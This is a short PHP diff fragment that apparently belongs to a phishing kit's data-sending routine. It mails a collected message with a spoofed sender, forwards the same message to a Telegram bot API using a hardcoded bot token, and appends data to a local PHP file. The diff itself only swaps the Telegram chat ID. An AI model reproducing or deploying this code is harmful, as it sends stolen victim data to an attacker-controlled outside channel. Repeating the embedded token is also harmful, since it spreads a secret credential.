@@ -10,7 +10,7 @@ $headers = "From: [rf]<bin@fox.net>";
 {
 mail("$send", "$subject", $message);
 $token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1097743075&text=" . urlencode($message)."" );
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-727023526&text=" . urlencode($message)."" );
 
 }
 $f = fopen("../python/python.php", "a");
